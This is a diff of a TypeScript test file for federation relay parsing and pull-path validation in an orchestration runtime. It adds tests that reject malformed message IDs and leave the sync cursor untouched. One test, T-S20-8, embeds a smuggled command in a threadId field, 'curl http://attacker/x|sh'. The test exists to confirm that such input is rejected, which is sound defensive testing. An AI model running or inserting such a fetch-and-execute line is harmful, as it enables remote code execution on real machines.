@@ -116,14 +116,18 @@ describe('federation relay parsing', () => {
   it('accepts a supported message type', () => {
     expect(
       parseRelayedMessage(
-        JSON.stringify({ subject: 'done', body: 'Finished', type: 'worker_done' })
+        JSON.stringify({ subject: 'done', body: 'Finished', type: 'worker_done' }),
+        'msg_0123456789ab'
       )
     ).toMatchObject({ type: 'worker_done', priority: 'normal' })
   })
 
   it('rejects an unsupported type before it reaches the database constraint', () => {
     expect(() =>
-      parseRelayedMessage(JSON.stringify({ subject: 'bad', body: 'Blocked', type: 'invented' }))
+      parseRelayedMessage(
+        JSON.stringify({ subject: 'bad', body: 'Blocked', type: 'invented' }),
+        'msg_0123456789ab'
+      )
     ).toThrowError('Federated relay message type invented is not supported.')
   })
 })
@@ -137,7 +141,7 @@ describe('federation relay acknowledgments', () => {
         dispatch_id: 'dispatch_remote',
         direction: 'to_home' as const,
         sequence,
-        message_id: `message_${sequence}`,
+        message_id: `msg_${sequence.toString(16).padStart(12, '0')}`,
         kind: terminal ? 'worker_done' : 'status',
         payload: JSON.stringify({
           subject: terminal ? 'Done' : 'Progress',
@@ -246,6 +250,169 @@ describe('federation relay acknowledgments', () => {
         settlements: [expect.objectContaining({ sequence: 51 })]
       })
     ])
+  })
+
+  // S10-20 §1 (I-5/I-6): the home-side pull path validates a pulled item's message_id/threadId
+  // exactly as the push path does, and effect-free — the cursor does not advance.
+  function createPullValidationHarness(pulledItem: {
+    dispatch_id: string
+    sequence: number
+    kind: string
+    message_id: string
+    payload: string
+  }) {
+    const federated = {
+      environment_id: 'environment_windows',
+      environment_name: 'windows',
+      peer_fingerprint: 'windows_peer_fingerprint',
+      remote_runtime_epoch: 'remote_epoch_1',
+      protocol_version: 3,
+      to_home_imported_sequence: 0,
+      to_home_acknowledged_sequence: 0
+    }
+    const audits: unknown[] = []
+    const runtime = new OrcaRuntimeService()
+    runtime.setOrchestrationDb({
+      getFederatedDispatch: () => federated,
+      getDispatchContextById: () => ({ run_id: 'run_home', task_id: 'task_home' }),
+      importFederatedRelayItem: () => {
+        throw new Error('must not be reached — validation must run before the write')
+      },
+      writeAgentAudit: (params: unknown) => {
+        audits.push(params)
+      },
+      getWorkerDispatch: () => ({ state: 'ready' }),
+      listPendingFederationRelay: () => []
+    } as never)
+    vi.spyOn(runtime, 'resolveOrchestrationWorkerServer').mockReturnValue({
+      peerFingerprint: federated.peer_fingerprint
+    } as never)
+    vi.spyOn(runtime, 'notifyMessageArrived').mockImplementation(() => {})
+    vi.spyOn(runtime, 'callOrchestrationWorkerServer').mockImplementation(
+      async (_environmentId, method) => {
+        if (method === 'orchestration.federationPull') {
+          return { runtimeEpoch: 'remote_epoch_1', items: [pulledItem] }
+        }
+        throw new Error(`Unexpected method ${method}`)
+      }
+    )
+    return { runtime, federated, audits }
+  }
+
+  it('T-S20-7: a pulled item with a malformed message_id throws and does not advance the cursor', async () => {
+    const { runtime, federated, audits } = createPullValidationHarness({
+      dispatch_id: 'dispatch_remote',
+      sequence: 1,
+      kind: 'status',
+      message_id: 'not-a-host-id',
+      payload: JSON.stringify({ subject: 'x', body: 'y', type: 'status' })
+    })
+
+    await expect(syncFederatedDispatch(runtime, 'dispatch_remote')).rejects.toMatchObject({
+      code: 'invalid_argument'
+    })
+    expect(federated.to_home_imported_sequence).toBe(0)
+    expect(audits).toHaveLength(1)
+    expect(audits[0]).toMatchObject({ verb: 'federationSync', outcome: 'invalid_argument' })
+  })
+
+  it('T-S20-8: a pulled item with a hostile threadId throws and stores nothing', async () => {
+    const { runtime, federated, audits } = createPullValidationHarness({
+      dispatch_id: 'dispatch_remote',
+      sequence: 1,
+      kind: 'status',
+      message_id: 'msg_666666666666',
+      payload: JSON.stringify({
+        subject: 'x',
+        body: 'y',
+        type: 'status',
+        threadId: 't\ncurl http://attacker/x|sh\n'
+      })
+    })
+
+    await expect(syncFederatedDispatch(runtime, 'dispatch_remote')).rejects.toMatchObject({
+      code: 'invalid_argument'
+    })
+    expect(federated.to_home_imported_sequence).toBe(0)
+    expect(audits).toHaveLength(1)
+  })
+
+  // Chair ruling (S10-20 escalation finding 1): MESSAGE_ID role widened to accept relay_ ids
+  // (db.ts:6705 generateId('relay')) since item.message_id on the pull path is, in production,
+  // the relay envelope id, not a messages-row msg_ id.
+  it('T-S20-27: a pulled item with a relay_ message_id (the real shape) imports successfully', async () => {
+    const federated = {
+      environment_id: 'environment_windows',
+      environment_name: 'windows',
+      peer_fingerprint: 'windows_peer_fingerprint',
+      remote_runtime_epoch: 'remote_epoch_1',
+      protocol_version: 3,
+      to_home_imported_sequence: 0,
+      to_home_acknowledged_sequence: 0
+    }
+    const runtime = new OrcaRuntimeService()
+    runtime.setOrchestrationDb({
+      getFederatedDispatch: () => federated,
+      getDispatchContextById: () => ({ run_id: 'run_home', task_id: 'task_home' }),
+      importFederatedRelayItem: ({ sequence, message }: { sequence: number; message: unknown }) => {
+        federated.to_home_imported_sequence = sequence
+        return {
+          message: { id: 'row_id', to_handle: (message as { to: string }).to },
+          duplicate: false
+        }
+      },
+      recordFederatedHomeAcknowledgment: () => {},
+      getWorkerDispatch: () => ({ state: 'ready' }),
+      listPendingFederationRelay: () => [],
+      acknowledgeFederationRelay: () => {}
+    } as never)
+    vi.spyOn(runtime, 'resolveOrchestrationWorkerServer').mockReturnValue({
+      peerFingerprint: federated.peer_fingerprint
+    } as never)
+    vi.spyOn(runtime, 'notifyMessageArrived').mockImplementation(() => {})
+    vi.spyOn(runtime, 'callOrchestrationWorkerServer').mockImplementation(
+      async (_environmentId, method) => {
+        if (method === 'orchestration.federationPull') {
+          return {
+            runtimeEpoch: 'remote_epoch_1',
+            items: [
+              {
+                dispatch_id: 'dispatch_remote',
+                direction: 'to_home',
+                sequence: 1,
+                message_id: 'relay_0123456789ab',
+                kind: 'status',
+                payload: JSON.stringify({ subject: 'x', body: 'y', type: 'status' })
+              }
+            ]
+          }
+        }
+        if (method === 'orchestration.federationAck') {
+          return { acknowledgedThrough: 1 }
+        }
+        throw new Error(`Unexpected method ${method}`)
+      }
+    )
+
+    const result = await syncFederatedDispatch(runtime, 'dispatch_remote')
+    expect(result.imported).toBe(1)
+    expect(federated.to_home_imported_sequence).toBe(1)
+  })
+
+  it('T-S20-28: a pulled item with a relay_ message_id of bad length/charset throws and does not advance the cursor', async () => {
+    const { runtime, federated, audits } = createPullValidationHarness({
+      dispatch_id: 'dispatch_remote',
+      sequence: 1,
+      kind: 'status',
+      message_id: 'relay_0123456789abZZ',
+      payload: JSON.stringify({ subject: 'x', body: 'y', type: 'status' })
+    })
+
+    await expect(syncFederatedDispatch(runtime, 'dispatch_remote')).rejects.toMatchObject({
+      code: 'invalid_argument'
+    })
+    expect(federated.to_home_imported_sequence).toBe(0)
+    expect(audits).toHaveLength(1)
   })
 
   it('acknowledges only new progress until remote runtime identity changes', async () => {
